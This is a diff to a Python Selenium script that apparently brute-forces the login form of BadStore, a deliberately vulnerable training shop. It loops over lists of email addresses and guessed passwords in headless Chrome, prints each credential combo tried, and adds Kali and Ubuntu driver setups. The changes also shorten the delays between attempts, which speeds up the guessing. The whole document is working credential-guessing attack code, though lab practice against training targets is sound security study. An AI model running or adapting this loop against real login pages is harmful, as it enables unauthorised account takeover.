@@ -70,13 +70,18 @@ chrome_options.add_argument("--headless")
 chrome_options.add_argument("--remote-debugging-port=9222")
 chrome_options.add_argument('--no-sandbox')
 
-driver = webdriver.Chrome('/usr/bin/chromedriver', chrome_options=chrome_options, service_args=["--verbose", "--log-path=D:\\temp3\\chromedriverxx.log"], desired_capabilities=d)
+# uncomment for normal ubuntu
+driver = webdriver.Chrome('/usr/bin/chromedriver', chrome_options=chrome_options, service_args=["--verbose"], desired_capabilities=d)
+
+# uncomment for Kali because broken dpkg
+#driver = webdriver.Chrome(executable_path=os.path.abspath("chromedriver"), chrome_options=chrome_options, service_args=["--verbose"], desired_capabilities=d)
+
 email_list = ["big@spender.com", "itsbrett@gmail.com", "joe@supplier.com", "julio.tan@gmail.com", "2@2.com"]
-passwd_list =["money", "time", "love", "hello123", "iforgot", "please"]
+passwd_list =["please", "time", "love", "hello123", "iforgot", "money"]
 for email in email_list:
         for passwd in passwd_list:
                 driver.get(target)
-                time.sleep(0.25)
+                time.sleep(0.5)
                 #print(driver.page_source)
                 assert "BadStore" in driver.title
                 #assert "Python" in driver.title
@@ -98,7 +103,7 @@ for email in email_list:
                 sys.stdout.write("Trying credential combo " + email + " / " + passwd + " ...")
                 elem.send_keys(Keys.RETURN)
                 ## Give time for iframe to load ##
-                time.sleep(3)
+                time.sleep(0.5)
                 ## You have to switch to the iframe like so: ##
                 driver.switch_to.frame(driver.find_element_by_tag_name("iframe"))
                 iframe = driver.page_source
